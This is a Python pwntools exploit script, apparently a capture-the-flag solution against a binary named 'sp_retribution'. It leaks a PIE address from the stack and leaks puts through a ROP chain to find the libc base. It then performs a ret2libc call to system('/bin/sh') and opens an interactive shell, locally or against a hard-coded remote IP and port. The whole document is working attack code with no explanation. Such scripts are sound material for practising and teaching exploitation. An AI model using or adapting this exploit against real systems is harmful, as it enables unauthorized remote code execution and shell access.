#!/usr/bin/env python3
# Get Pie leak from stack
# Get Libc leak from puts
# ret2libc

from pwn import *

exe = ELF("./sp_retribution")
libc = ELF("./glibc/libc.so.6")

context.binary = exe
context.log_level = "debug"

offset = 88
pop_rdi = 0x0000000000000D33  #: pop rdi; ret;


def conn():
    if args.REMOTE:
        io = remote("178.62.73.26", 30333)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io


io = conn()

# Get Pie leak from stack
io.sendlineafter(b">> ", b"2")
io.send(b"A" * 8)
io.recvuntil(b"A" * 8)
leak = io.recvuntil(b"\n", drop=True)
info("Leak: %x", u64(leak.ljust(8, b"\x00")))

exe.address = u64(leak.ljust(8, b"\x00")) - 0xD70
info("Pie base:%#x", exe.address)

# Get libc leak from got.puts
rop = ROP(exe)
rop.puts(exe.got.puts)
rop.missile_launcher()

io.sendlineafter(b": ", flat({offset: rop.chain()}))

print(io.recvuntil(b"34m\n"))
leak = io.recvuntil(b"\n\n", drop=True)
libc.address = u64(leak.ljust(8, b"\x00")) - 0x6F6A0
info("Libc base:%#x", libc.address)

io.send(b"A")

# Ret2libc
rop = ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
io.sendlineafter(b": ", flat({offset: rop.chain()}))

io.interactive()
